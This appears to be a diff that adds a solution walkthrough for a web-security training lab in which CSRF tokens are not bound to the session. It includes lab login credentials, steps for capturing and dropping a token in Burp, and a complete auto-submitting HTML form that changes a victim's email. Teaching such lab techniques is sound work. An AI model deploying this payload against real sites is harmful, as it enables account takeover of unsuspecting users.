@@ -1,0 +1,96 @@
+CSRF Vulnerability With Token Not Tied To Session — Step-by-Step PoC Guide
+Lab Goal
+
+Exploit the CSRF vulnerability to change the victim’s email address.
+
+This lab is vulnerable because:
+
+CSRF tokens are not tied to the user's session
+
+Meaning:
+
+A token from Wiener account can work on Carlos/victim account.
+Step 1 — Login as Wiener
+
+Open Burp browser and login using:
+
+Username: wiener
+Password: peter
+Step 2 — Intercept Email Change Request
+Turn Burp Intercept ON
+Go to:
+My Account
+Change email to anything:
+abc@gmail.com
+Click:
+Update email
+Step 3 — Copy CSRF Token
+
+You will capture request like:
+
+POST /my-account/change-email HTTP/2
+
+email=abc%40gmail.com&csrf=V1QEi3uKYnCe6EWmi4QkcW4FFQ2WdPBh
+
+Copy ONLY the token:
+
+V1QEi3uKYnCe6EWmi4QkcW4FFQ2WdPBh
+Step 4 — Drop The Request
+
+Click:
+
+Drop
+
+Important:
+
+Do NOT forward request
+Token must remain unused
+Step 5 — Open Exploit Server
+
+Open:
+
+Exploit Server
+
+Delete everything from Body section.
+
+Step 6 — Paste Final CSRF Exploit
+
+Paste this exact payload:
+
+<html>
+  <body>
+    <form action="https://0abc00f7033b795280ea175c005f00af.web-security-academy.net/my-account/change-email" method="POST">
+
+      <input type="hidden" name="email" value="xaa@gmail.com" />
+
+      <input type="hidden" name="csrf" value="V1QEi3uKYnCe6EWmi4QkcW4FFQ2WdPBh" />
+
+    </form>
+
+    <script>
+      history.pushState('', '', '/');
+      document.forms[0].submit();
+    </script>
+  </body>
+</html>
+Step 7 — Store Exploit
+
+Click:
+
+Store
+Step 8 — Deliver To Victim
+
+IMPORTANT:
+
+Do NOT click View exploit
+
+Because token is single-use.
+
+Immediately click:
+
+Deliver to victim
+Expected Result
+
+The victim account email changes automatically.
+
+Lab solved ✅
